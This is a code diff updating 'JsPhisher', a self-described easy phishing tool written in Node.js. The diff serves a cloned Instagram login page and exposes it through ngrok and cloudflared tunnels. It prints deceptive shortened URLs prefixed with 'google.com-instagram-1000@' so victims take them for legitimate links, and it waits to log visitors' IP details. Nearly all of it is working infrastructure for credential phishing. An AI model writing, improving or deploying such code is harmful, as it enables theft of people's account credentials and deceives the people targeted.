@@ -1,12 +1,14 @@
 /**
  * JsPhisher - Easy phishing tool
  * Coded by: @gamerboytr
+ * License: GPL-3.0
  * Its a open-source project
+ * Please report any bugs to: https://github.com/gamerboytr/JsPhisher/issues
  */
 
 "use strict";
 try {
-	require("express");
+	require("body-parser");
 } catch (e) {
 	console.clear();
 	if (e.code !== "MODULE_NOT_FOUND") throw e;
@@ -27,12 +29,11 @@ const AdmZip = require("adm-zip");
 const axios = require("axios").default;
 const app = express();
 const port = process.env.PORT || process.env.NODE_PORT || 6969;
-const ngrok = require("ngrok");
 const short = require("./short");
 const path = require("path");
 const fs = require("fs");
 
-const VERSION = "1.1";
+const VERSION = "1.2";
 const isLinux = process.platform === "linux";
 const logAsk = chalk.greenBright`[{whiteBright ?}]`;
 const logSuccess = chalk.yellowBright`[{whiteBright √}]`;
@@ -60,7 +61,8 @@ if (process.platform === "darwin") {
 }
 
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, "util", "instagram")));
+app.use(express.static(path.join(__dirname, "bin", "instagram")));
+app.disable("x-powered-by");
 
 (async () => {
 	await controlVersion();
@@ -73,27 +75,17 @@ app.use(express.static(path.join(__dirname, "util", "instagram")));
 		})
 	);
 	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
-	const ngrokSw = await ngrok.connect(port).catch(console.error);
-	const shortNgrok = await short(ngrokSw).catch(console.error);
-	const cloudflared = child_process.spawn("util/cloudflared", ["tunnel", "--url", `http://localhost:${port}`]);
-	let cfUrl;
-	let cfShowed = false;
-	let cfReady = false;
-	cloudflared.stderr.on("data", async data => {
-		if (data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/)) cfUrl = data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/);
-		cfReady = !!data.toString().match(/Connection (.*) registered/);
-		if (cfReady && !cfShowed) {
-			cfShowed = true;
-			const shortCf = await short(cfUrl[0]).catch(console.error);
-			console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
-			console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cfUrl[0]}}\n`);
-			console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${shortCf.split("/")[0] + "//google.com-instagram-1000@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
-			console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
-			console.log(chalk.magenta`${logInfo2} URL 3 > {yellowBright ${ngrokSw}}\n`);
-			console.log(chalk.magenta`${logInfo2} URL 4 > {yellowBright ${shortNgrok.split("/")[0] + "//google.com-instagram-1000@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
-			console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
-		}
-	});
+	const ngrok = await openNgrok(port);
+	const shortNgrok = await short(ngrok).catch(console.error);
+	const cloudflared = await openCloudflared(port);
+	const shortCf = await short(cloudflared).catch(console.error);
+	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
+	console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
+	console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${shortCf.split("/")[0] + "//google.com-instagram-1000@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
+	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
+	console.log(chalk.magenta`${logInfo2} URL 3 > {yellowBright ${ngrok}}\n`);
+	console.log(chalk.magenta`${logInfo2} URL 4 > {yellowBright ${shortNgrok.split("/")[0] + "//google.com-instagram-1000@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
+	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
 })();
 
 app.all("/", async (req, res) => {
@@ -127,8 +119,8 @@ app.all("/", async (req, res) => {
 	}
 });
 
-app.get("/login", (req, res) => {
-	res.sendFile(path.join(__dirname, "util", "instagram", "login.html"));
+app.get("/login", (_req, res) => {
+	res.sendFile(path.join(__dirname, "bin", "instagram", "login.html"));
 });
 
 app.post("/login", (req, res) => {
@@ -187,21 +179,61 @@ function installRequirements() {
 	return new Promise(async (resolve, reject) => {
 		console.clear();
 		console.log(logLogo);
-		if (!fs.existsSync(path.join(__dirname, "util", `cloudflared${isLinux ? ".deb" : ".exe"}`))) {
+		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${isLinux ? ".deb" : ".exe"}`))) {
 			console.log(chalk.yellow`${logInfo2} Downloading cloudflared...`);
-			let cloudflaredLink = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isLinux ? "linux" : "windows"}-`;
-			cloudflaredLink += isLinux && process.arch === "x64" ? "amd64.deb" : isLinux ? "386.deb" : "386.exe";
-			await downloader(cloudflaredLink, path.join(__dirname, "util"), { filename: `cloudflared${isLinux ? ".deb" : ".exe"}` }).catch(reject);
+			const cloudflaredLink = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isLinux ? "linux-386.deb" : "windows-386.exe"}`;
+			await downloader(cloudflaredLink, path.join(__dirname, "bin"), { filename: `cloudflared${isLinux ? ".deb" : ".exe"}` }).catch(reject);
 			console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
 		}
-		if (fs.existsSync(path.join(__dirname, "util", "instagram.zip"))) {
+		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${isLinux ? ".deb" : ".exe"}`))) {
+			console.log(chalk.yellow`${logInfo2} Downloading ngrok...`);
+			const ngrokLink = `https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-${isLinux ? "linux-386.tgz" : "windows-386.zip"}`;
+			await downloader(ngrokLink, path.join(__dirname, "bin"), { filename: `ngrok${isLinux ? ".tgz" : ".zip"}` }).catch(reject);
+			console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
+			console.log(chalk.yellow`${logInfo2} Extracting...`);
+			if (isLinux) {
+				child_process.execSync(`tar -xvf ${path.join(__dirname, "bin", "ngrok.tgz")} -C ${path.join(__dirname, "bin")}`);
+				fs.unlinkSync(path.join(__dirname, "bin", "ngrok.zip"));
+			} else {
+				new AdmZip(path.join(__dirname, "bin", "ngrok.zip")).extractAllTo(path.join(__dirname, "bin"));
+				fs.unlinkSync(path.join(__dirname, "bin", "ngrok.zip"));
+			}
+			console.log(chalk.yellow`${logSuccess} Extracted!\n`);
+		}
+		if (fs.existsSync(path.join(__dirname, "bin", "instagram.zip"))) {
 			console.log(chalk.yellow`${logInfo2} Extracting instagram...`);
-			new AdmZip(path.join(__dirname, "util", "instagram.zip")).extractAllTo(path.join(__dirname, "util", "instagram"), true);
+			new AdmZip(path.join(__dirname, "bin", "instagram.zip")).extractAllTo(path.join(__dirname, "bin", "instagram"), true);
 			console.log(chalk.yellow`${logSuccess} Extracted!\n`);
 			console.log(chalk.yellow`${logInfo2} Removing instagram.zip...`);
-			fs.unlinkSync(path.join(__dirname, "util", "instagram.zip"));
+			fs.unlinkSync(path.join(__dirname, "bin", "instagram.zip"));
 			console.log(chalk.yellow`${logSuccess} Removed!\n`);
 		}
 		resolve();
+	});
+}
+
+function openNgrok(port) {
+	return new Promise(async (resolve, reject) => {
+		child_process.spawn("bin/ngrok.exe", ["http", port]);
+		await new Promise(r => setTimeout(r, 3000));
+		const { data } = await axios.get("http://127.0.0.1:4040/api/tunnels").catch(() => {});
+		if (!data) return reject("Failed to start ngrok, please try again");
+		resolve((data.tunnels?.[1] ?? data.tunnels?.[0]).public_url);
+	});
+}
+
+function openCloudflared(port) {
+	return new Promise(async resolve => {
+		let cfUrl;
+		let cfShowed = false;
+		let cfReady = false;
+		child_process.spawn("bin/cloudflared", ["tunnel", "--url", `http://localhost:${port}`]).stderr.on("data", async data => {
+			if (data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/)) cfUrl = data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/);
+			cfReady = !!data.toString().match(/Connection (.*) registered/);
+			if (cfReady && !cfShowed) {
+				cfShowed = true;
+				resolve(cfUrl[0]);
+			}
+		});
 	});
 }
